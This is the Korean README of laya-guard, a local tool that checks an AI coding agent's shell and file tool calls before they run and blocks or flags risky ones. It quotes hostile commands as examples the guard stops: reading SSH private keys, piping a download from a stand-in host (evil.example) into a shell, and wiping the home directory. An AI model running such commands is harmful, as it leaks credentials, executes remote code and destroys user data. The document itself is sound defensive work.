<p align="center">
  <img src="assets/logo.svg" width="120" alt="laya-guard">
</p>

<h1 align="center">laya-guard</h1>

<p align="center">
  <b>모든 도구 호출을, 실행되기 전에 판정합니다.</b><br>
  AI 코딩 에이전트용 무료 로컬 가드레일.
</p>

<p align="center">
  <a href="https://github.com/scs0209/laya-guard/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/scs0209/laya-guard/actions/workflows/ci.yml/badge.svg"></a>
  <a href="https://pypi.org/project/laya-guardrail/"><img alt="PyPI" src="https://img.shields.io/pypi/v/laya-guardrail.svg?style=flat-square"></a>
  <a href="pyproject.toml"><img alt="Python 3.10+" src="https://img.shields.io/badge/python-3.10%2B-blue?style=flat-square"></a>
  <a href="LICENSE"><img alt="MIT License" src="https://img.shields.io/badge/license-MIT-2ecc71?style=flat-square"></a>
  <img alt="macOS · Linux" src="https://img.shields.io/badge/macOS%20·%20Linux-555?style=flat-square">
</p>

<p align="center">
  <a href="#-빠른-시작"><b>빠른 시작</b></a> ·
  <a href="#-지원-에이전트"><b>지원 에이전트</b></a> ·
  <a href="docs/ko/guide/dashboard.md">대시보드</a> ·
  <a href="docs/ko/guide/how-it-works.md">동작 구조</a> ·
  <a href="#-벤치마크">벤치마크</a> ·
  <a href="README.md">English</a>
</p>

<p align="center">
  <img src="demo/hero_en.gif" width="750" alt="laya-guard가 cat ~/.ssh/id_rsa, curl | sh, rm -rf ~를 막고 pytest는 통과시키는 모습">
</p>

---

코딩 에이전트는 당신의 컴퓨터에서 `cat ~/.ssh/id_rsa`, `curl … | sh`, `rm -rf ~`를 실행할 수 있습니다. laya-guard는
명령이 실행되기 **전에** 답합니다. **막거나**, **묻거나**, **통과시킵니다**. 알려진 위험 패턴은 정규식이 먼저 잡고,
나머지는 소형 다국어 모델(Laya, ~322M, Apache-2.0)이 노트북에서 약 0.1초 만에 판정합니다.

무료이고 MIT 라이선스입니다. API 키도, 호출당 과금도 없으며, 판정 로그에는 명령 원문을 절대 남기지 않습니다.

## ✨ 왜 laya-guard인가

| | |
|---|---|
| 🛑 **실행 전에 판정** | 에이전트가 제안하는 모든 명령에 `allow`, `review`(사용자에게 물음), `block` 중 하나를 정책과 이유와 함께 답합니다. `npm test && curl … \| sh` 같은 체인은 나눠서 판정하고, 가장 나쁜 판정을 씁니다. |
| 💻 **로컬, 무료** | 정규식 적중과 안전 명령은 즉시 답합니다. 나머지는 CPU에서 도는 ~322M 모델이 판정당 약 85–90ms에 처리합니다. |
| 🔌 **에이전트 11종, 명령 하나** | `laya-guard install <에이전트>`가 diff를 먼저 보여주고, 설정을 백업한 뒤, 훅에 테스트 호출 두 건을 보내 확인합니다. |
| 🔐 **파일 보호** | `--files`를 붙이면 Claude Code의 `Read`, `Edit`, `Write`를 보호 경로와 대조합니다. 자격 증명 저장소, `.env*`, 개인 키, 셸 시작 파일, `.git/hooks`가 대상입니다. |
| 👣 **에이전트가 건드린 것 보기** | 도구 호출이 지목한 파일 기록(선택), 스크립트가 실제로 연 파일을 보는 macOS 모니터(선택), 이를 요약하고 보호할 경로를 추천하는 `laya-guard footprint`. |
| 🧯 **서버가 꺼져도 동작** | 훅이 오프라인 정규식 검사로 대체하고, 판정할 수 없는 것은 사용자에게 넘깁니다(물을 수 없는 에이전트에서는 차단). |
| 📊 **localhost 대시보드** | 판정을 보고, 클릭 한 번으로 훅을 설치하고, 호출이 파이프라인을 지나는 모습을 3D 시뮬레이션으로 봅니다. |

<p align="center">
<picture>
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-overview-light.png">
  <img src="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-overview-dark.png" width="820" alt="laya-guard 대시보드: 판정 건수, 최근 호출 테이프, 보호되는 에이전트">
</picture>
</p>

## 🚀 빠른 시작

**브라우저에서 써 보기:** [huggingface.co/spaces/Ayaannnnnnn/laya-guard-trial](https://huggingface.co/spaces/Ayaannnnnnn/laya-guard-trial)에
명령을 붙여 넣으면 훅이 뭐라고 답할지 모델과 함께 보여 줍니다([space/](space/README.md), 기록하지 않음).

**10초 만에 써 보기** (모델·서버·훅 없이. 위 데모가 실행하는 바로 그것입니다):

```bash
pip install --no-deps laya-guardrail pyyaml
laya-guard check --offline "cat ~/.ssh/id_rsa"     # [BLOCK] ... policy=credential-read
```

**훅을 설치하기 전에** 최근 하루치 Claude Code·Codex 세션에서 무엇이 걸렸을지 확인할 수 있습니다(이 컴퓨터에서만
읽고, 기록하거나 보내지 않음; [감사](docs/ko/guide/audit.md)):

```bash
pip install laya-guardrail
laya-guard audit                    # 일주일은 --since 7d, 스크린샷용은 --redact
```

**내 에이전트에 붙이기:**

```bash
pip install laya-guardrail          # PyPI 이름이며, 설치되는 명령은 `laya-guard`입니다
laya-guard serve                    # 모델을 올린 뒤 localhost:8787에서 대기
laya-guard install claude-code      # diff를 먼저 보여주고, 설정을 백업한 뒤, 훅을 점검합니다
laya-guard dashboard                # 클릭으로도 가능하고, 가드가 하는 일도 볼 수 있습니다
```

> **패키지 이름은 `laya-guardrail`입니다.** `pip install laya-guard`는 무관한 다른 프로젝트
> ([dockndevai/laya-guard](https://pypi.org/project/laya-guard/))를 설치합니다.

Python ≥ 3.10이 필요합니다. 모델 런타임이 PyTorch + transformers를 함께 설치하고(플랫폼에 따라 수백 MB~수 GB), ~322M
체크포인트는 첫 `serve` 때 내려받습니다. `laya-guard service install`을 쓰면 로그인할 때마다 서버가 켜집니다
([자세히](docs/ko/guide/reliability.md#계속-실행해-두기와-장애-알림)).

## 🔌 지원 에이전트

| 에이전트 | 설치 | `review` 처리 |
|---|---|---|
| [Claude Code](guard-hook.sh) | `laya-guard install claude-code` | 권한 프롬프트 |
| [Codex CLI](integrations/codex/) | `laya-guard install codex` | 허용 + 안내 |
| [Cursor](integrations/cursor/) | `laya-guard install cursor` | 권한 프롬프트 |
| [Gemini CLI](integrations/gemini/check.py) | `laya-guard install gemini-cli` | 허용 + 안내 |
| [Qwen Code](integrations/qwen/check.py) | `laya-guard install qwen-code` | 권한 프롬프트 (headless에선 거부) |
| [Windsurf](integrations/windsurf/guard.py) | `laya-guard install windsurf` | 허용 + 안내 |
| [Copilot CLI](integrations/copilot/policy.py) | `laya-guard install copilot-cli` | 권한 프롬프트 (headless에선 거부) |
| [Cline](integrations/cline/PreToolUse) | `laya-guard install cline` | 통과 |
| [OpenCode](integrations/opencode/laya-guard.ts) | `laya-guard install opencode` | 허용 + 경고 |
| [Kilo Code](integrations/kilo/laya-guard.ts) | `laya-guard install kilo` | 허용 + 경고 |
| [Amp](integrations/amp/laya-guard.ts) | `laya-guard install amp` | 허용 + 안내 |

Aider, Roo Code, Continue, Junie는 훅 메커니즘이 없어 어댑터가 없습니다. `install`이 무엇을 쓰는지, 직접 할 일은
무엇인지, 직접 만든 에이전트 루프에서 HTTP로 가드를 부르는 방법은 **[에이전트 가이드](docs/ko/guide/agents.md)**에
있습니다.

## 🔐 파일: 보호, 기록, 검토

훅은 기본으로 명령을 판정합니다. 파일은 직접 켜는 네 가지가 맡습니다:

```bash
laya-guard install claude-code --files   # Claude Code의 파일 도구(Read, Edit, Write 등)도 보호 경로와 대조
laya-guard activity on                   # 에이전트의 도구 호출이 지목한 파일 기록 (경로만, 내용은 절대 아님)
laya-guard watch                         # macOS: 에이전트 프로세스가 실제로 연 파일까지 추가 (sudo 필요)
laya-guard footprint --suggest           # 프로젝트별로 무엇을 건드렸는지, 살펴볼 만한 protect.yaml 항목
```

* **보호 경로.** 자격 증명 저장소, `.env*` 파일, 개인 키를 읽으면 검토, 자격 증명 저장소를 바꾸면 차단, 셸 시작 파일,
  `.git/hooks`, 에이전트 자신의 설정에 쓰면 검토입니다. 내 규칙은 `~/.config/laya-guard/protect.yaml`에 추가합니다.
  파일 도구 보호는 지금은 Claude Code만 지원하고, 셸 명령은 모든 에이전트에서 같은 규칙을 적용합니다.
* **보는 범위.** 훅은 도구 호출이나 명령 텍스트가 지목한 경로를 봅니다. `python -c` 코드 안의 경로도 포함됩니다.
  스크립트가 실행 중에 만들어 내는 경로는 `watch`에만 닿고, `watch`는 기록할 뿐 막지 못합니다.

자세히는 **[파일 가이드](docs/ko/guide/file-protection.md)**에 있습니다.

## 📸 스크린샷

| | |
|---|---|
| ![Agents 화면](https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-agents-dark.png) | ![설치 시트](https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-install-sheet-dark.png) |
| **Agents**: 이 컴퓨터의 코딩 에이전트를 찾아 훅이 있는지 보여줍니다 | **설치 시트**: 아무것도 쓰기 전에 정확한 diff를 보여줍니다 |
| ![Calls 화면](https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-calls-dark.png) | ![시뮬레이션 화면](https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/dashboard-simulation-dark.png) |
| **Calls**: 판정마다 정책, 이유, 소요 시간. 명령 원문은 없습니다 | **Simulation**: 파이프라인을 3D 디오라마로, 공격 시나리오는 실제 평가기가 판정 |

<p align="center">
  <img src="https://raw.githubusercontent.com/scs0209/laya-guard/main/docs/images/ai-scenario-demo.gif" width="820" alt="기록된 AI 시나리오: laya-guard가 오염된 npm test를 차단하고, curl 명령은 보류되었다가 거부됩니다">
</p>
<p align="center"><sub><b>AI 시나리오</b>: 상황을 적으면 이미 쓰는 Claude Code가 가상 저장소에서 에이전트 역할을 하고, 제안하는
모든 명령을 실제 평가기가 판정합니다. 아무것도 실행하지 않습니다. 스크린샷은 지어낸 데이터입니다.
<a href="docs/ko/guide/dashboard.md">대시보드 가이드</a></sub></p>

## 📊 벤치마크

| 스위트 | 결과 | 명령 |
|---|---|---|
| AgentDojo v1 공격 (심판 레벨) | **25/27 차단** | `eval/run_agentdojo.py` |
| AgentDojo v1 정상 (심판 레벨) | **92/97 유지** (allow+review) | `eval/run_agentdojo.py` |
| E2E 롤아웃 (qwen2.5:7b 에이전트 + 가드) | **4/4 시나리오** (1 방어, 2 미시도, 1 정상 OK) | `eval/run_rollout.py` |
| 실제 사고 재현 (공개된 사고 7건) | **13/13 붙잡음** (0.5.1에선 12/13. 놓친 GraphQL 호출 안의 삭제에 규칙 추가) | `eval/run_incidents.py` |
| [사고 벤치마크](bench/README.ko.md): 같은 사고 + 셸 변형 30 + 평범한 명령 50을 dcg·cc-safety-net·shellfirm과 Claude Code 훅으로 비교 | **13/13, 30/30 붙잡음**(대부분 확인 요청), 평범한 명령 46/50 허용; dcg 5/13, 26/30, 48/50 | `bench/run.py` |
| 셸 명령 (자체: 일상 35 + 위험/우회 36) | **69/71** (실전 모델) | `eval/run_eval.py --set shell` |
| 한국어 30문항 (자체) | **30/30** (MOCK·실전 모두) | `eval/run_eval.py` |

두 자체 셋은 검증 대상 규칙과 함께 만들어졌으니 정확도 주장이 아니라 회귀 게이트로 봐주세요. 외부 기준 수치는
AgentDojo이며, 자체 측정이고 심판 레벨입니다. 놓친 사례와 각 수치의 배경은
[벤치마크 자세히](docs/ko/guide/how-it-works.md#벤치마크-재현-가능-좋은-것만-골라내지-않음)에 있습니다. 재현한 사고별
출처와, 그 에이전트가 실제로 멈췄을지는 [실제 사고 재현](docs/ko/guide/incidents.md)에 있습니다.
사고 벤치마크는 laya-guard 작성자가 만들었으니 laya-guard 행은 홈 팀 결과로 봐 주세요. 모든 가드의 응답 원문을
함께 공개했습니다.

## 🧠 동작 구조

```
에이전트 tool_call
  → 에이전트의 훅 (`laya-guard install`이 설치)
  → POST /guard (localhost:8787)
  → 체인(`a && b`, `a; b`, 스크립트의 각 줄)은 명령별로 나눠 판정하고, 가장 나쁜 판정을 씀
  → policy.yaml: 정규식 정책 12종
      · block 등급 적중   → 즉시 차단, 모델 미호출
      · review 등급 적중  → 모델이 판정, 하한은 review
      · 안전 명령         → 즉시 허용 (ls, git status, `grep x f | head`…)
      · 그 외             → 모델이 자유롭게 판정
  → Laya → allow / review / block
      (검토를 사람에게 묻는 에이전트에서는, 모델만 내린 차단을 검토로 바꿈)
```

* **규칙이 먼저.** [policy.yaml](src/laya_guard/policy.yaml)의 정규식 정책 12종이 모델을 부르지 않고 알려진 패턴을
  잡습니다. 코드 수정 없이 고치거나 추가할 수 있습니다.
* **안전 명령 레인.** 셸 메타문자, 위험한 플래그, 민감 경로가 없는 명령은 즉시 허용하고, 이런 명령을 파이프로 잇고
  출력을 버리는 것(`grep -n x f 2>/dev/null | head`)도 마찬가지입니다. Windows 경로와 cmd·PowerShell의 같은 명령도
  포함됩니다. `npm test` 같은 명령은 실제로 실행될 package.json 스크립트를 먼저 정규식으로 검사합니다.
* **모델은 묻고, 규칙은 막습니다.** Claude Code, Cursor, Qwen Code, Copilot CLI에서는 모델만 내린 차단이 권한 확인으로
  바뀝니다. block 등급 정규식이나 보호 경로는 여전히 차단합니다. 검토를 안내만 남기고 통과시키는 에이전트에서는 모델의
  차단을 그대로 유지합니다.
* **믿을 수 없는 출처는 더 엄격하게.** 도구 결과, 이메일, 웹 페이지에서 나온 호출은 임계값이 낮아집니다. 간접 인젝션을
  막는 장치가 이것입니다.
* **기본이 비공개.** 판정 로그에는 판정, 위험도, 정책, 지연 시간, 해시만 남고 명령 원문은 없습니다.

자세히: [내부 구조](docs/ko/guide/how-it-works.md).

## 📚 가이드

| 가이드 | 내용 |
|---|---|
| [감사](docs/ko/guide/audit.md) | `laya-guard audit`: Claude Code와 Codex가 이미 실행한 셸 명령을 그 대화 기록으로 판정 |
| [에이전트](docs/ko/guide/agents.md) | 에이전트별 설치, 각각 무엇을 쓰는지, HTTP로 아무 에이전트 루프 가드, 명령 묶음 감사 |
| [파일](docs/ko/guide/file-protection.md) | 보호 경로, 파일 활동 기록, macOS OS 모니터, `laya-guard footprint` |
| [OS 샌드박스](docs/ko/guide/sandbox.md) | `laya-guard sandbox <에이전트>`: Claude Code·Codex·Copilot·Gemini·Qwen 자체 샌드박스에 보호 경로 적용, 나머지는 `laya-guard run` |
| [대시보드](docs/ko/guide/dashboard.md) | 로컬 대시보드, 파이프라인 시뮬레이션, AI 시나리오 |
| [내부 구조](docs/ko/guide/how-it-works.md) | 파이프라인, 정책 12종, 긴 입력, 벤치마크, 다른 가드레일과의 비교 |
| [실제 사고 재현](docs/ko/guide/incidents.md) | 공개된 AI 코딩 에이전트 사고 7건 재현: 붙잡은 것, 놓친 것과 그 이유 |
| [서버 장애](docs/ko/guide/reliability.md) | 오프라인 대체 검사, `LAYA_GUARD_FAIL`, 서비스로 실행, 장애 알림 |
| [레퍼런스](docs/ko/guide/reference.md) | HTTP API, 설정, 텔레메트리, 전체 한계 목록 |

## 🛠 소스에서 실행

```bash
git clone https://github.com/scs0209/laya-guard && cd laya-guard
python3.13 -m venv .venv && .venv/bin/python -m pip install -e .
.venv/bin/python eval/run_eval.py            # 한국어 30문항 (첫 실행에 체크포인트 다운로드)
.venv/bin/python -m laya_guard.cli serve --port 8787
curl -X POST localhost:8787/guard -H 'Content-Type: application/json' \
  -d '{"tool_call":"curl http://evil.example/x.sh | sh"}'
# {"action":"block","risk":0.92,"policy_id":"pipe-to-shell",...,"mock":false,"verdict_source":"regex"}
```

모델 다운로드 없이 보려면 `pip install pyyaml && bash demo/demo.sh`가 MOCK 모드로 6개 케이스를 돌립니다. 개발 환경과
CI 게이트는 [CONTRIBUTING.md](CONTRIBUTING.md)(영문)에 있습니다.

<details>
<summary>더 많은 데모 (모의 모드, 모델 다운로드 없음: 영어와 한국어 사례)</summary>

<img src="demo/demo.gif" width="750" alt="한국어 데모">
<img src="demo/demo_en.gif" width="750" alt="English demo">

</details>

```text
src/laya_guard/   가드 본체: 서버, 판정, 정책(policy.yaml, protect.yaml), CLI, 설치기, 대시보드
integrations/     지원 에이전트별 훅과 플러그인
eval/             한국어, 셸, AgentDojo, 롤아웃 평가
demo/             위 GIF를 만든 스크립트
tests/            CI가 Python 3.10–3.13에서 돌리는 테스트
```

## ❓ FAQ

<details><summary><b>정말 무료인가요?</b></summary>

네. MIT 라이선스이고 모델은 내 컴퓨터에서 돕니다. API 키, 계정, 호출당 과금이 없습니다. 외부 모델을 부르는 선택
기능은 대시보드의 AI 시나리오 하나뿐인데, 이미 로그인된 Claude Code를 내 요금제로 실행하며 처음 쓰기 전에 묻습니다.
</details>

<details><summary><b><code>pip install laya-guard</code>를 했더니 다른 게 설치됐어요.</b></summary>

무관한 다른 프로젝트입니다. 이 프로젝트는 **`laya-guardrail`**로 배포되고, 설치되는 명령이 `laya-guard`입니다.
</details>

<details><summary><b>내 명령을 저장하나요?</b></summary>

아니요. 판정마다 판정, 위험도, 정책, 지연 시간, SHA-256 앞자리만 로컬에 기록하고 원문은 남기지 않습니다.
`LAYA_GUARD_LOG=0`으로 끌 수 있습니다. 직접 켜야 하는 파일 활동 기록은 파일 경로를 저장하고, 파일 내용은 저장하지
않습니다.
</details>

<details><summary><b>서버가 꺼지면 어떻게 되나요?</b></summary>

모든 훅은 10초를 기다린 뒤 오프라인 검사를 합니다. 정규식에 걸리면 차단, 안전 명령은 허용, 나머지는 사용자에게
묻거나 물을 수 없는 에이전트에서는 차단합니다. `LAYA_GUARD_FAIL=closed`면 차단, `open`이면 통과입니다.
[서버 장애](docs/ko/guide/reliability.md)
</details>

<details><summary><b>스크립트가 내 비밀 파일을 읽는 것도 막나요?</b></summary>

일부만 막습니다. 명령에 적힌 보호 경로는 `python -c` 코드 안에 있어도 검토하거나 차단합니다. 스크립트나 자식
프로세스가 실행 중에 만들어 낸 경로로 여는 파일은 훅에 닿지 않습니다. macOS에서는 `laya-guard watch`가 OS에서 그런
읽기를 기록하지만, 알려주기만 합니다.
[파일 가이드](docs/ko/guide/file-protection.md)
</details>

<details><summary><b>Windows에서 되나요?</b></summary>

아직 안 됩니다. Claude Code 훅이 bash 스크립트이고, 백그라운드 서비스는 macOS LaunchAgent나 Linux systemd 유닛입니다.
</details>

<details><summary><b>다른 가드레일과 무엇이 다른가요?</b></summary>

대부분의 가드레일은 프롬프트 텍스트를 검사합니다. laya-guard는 한 단계 뒤에서 에이전트가 실행하려는 도구 호출 자체를
판정하고, 중간에 사람 승인 단계가 있습니다. [비교표](docs/ko/guide/how-it-works.md#비교표)
</details>

## ⚠️ 한계

* **선언된 접근만 봅니다.** 훅은 명령과 도구 호출이 지목한 경로만 봅니다. 안전 명령이 실행하는 코드(테스트 파일,
  `conftest.py`, `build.rs`, Makefile 레시피)는 검사하지 않습니다.
* **체인은 부분별로 판정하므로** 모델은 `cat shadow` 앞에 `cd /etc`가 있었다는 걸 모릅니다.
* **수치는 자체 측정입니다.** AgentDojo 결과는 종단간이 아니라 심판 레벨이고, 모델이 한국어 위주로 튜닝되어 오탐은
  대개 영어 프롬프트에서 나옵니다.

신뢰하기 전에 [전체 목록](docs/ko/guide/reference.md#한계-신뢰하기-전에-읽어주세요)을 읽어주세요.

## 🤝 기여

PR 환영합니다. 개발 환경, CI 게이트, 가이드라인은 [CONTRIBUTING.md](CONTRIBUTING.md)(영문)에 있고, 남은 작업은
[GitHub Issues](https://github.com/scs0209/laya-guard/issues)에 있습니다. 가장 도움이 되는 제보는 잘못 판정된
명령입니다. Missed attack 또는 Overblock 이슈 양식을 써주세요. 변경 내역은 [CHANGELOG.md](CHANGELOG.md)에 있습니다.
laya-guard 자체의 취약점을 찾았다면 공개 이슈 대신 [SECURITY.md](SECURITY.md)를 따라 비공개로 제보해주세요. 이
프로젝트는 [Contributor Covenant](CODE_OF_CONDUCT.md) 행동 강령을 따릅니다.

laya-guard가 쓸모 있었다면 **⭐ 하나가 더 많은 사람에게 닿는 데 도움이 됩니다.**

<a href="https://star-history.com/#scs0209/laya-guard&Date">
  <img src="https://api.star-history.com/svg?repos=scs0209/laya-guard&type=Date" width="600" alt="Star history">
</a>

## 📄 라이선스

[MIT](LICENSE). Laya 모델은 Apache-2.0이고, 대시보드에는 [three.js](https://threejs.org)(MIT,
`src/laya_guard/static/vendor/THREE_LICENSE.txt`)가 들어 있습니다.
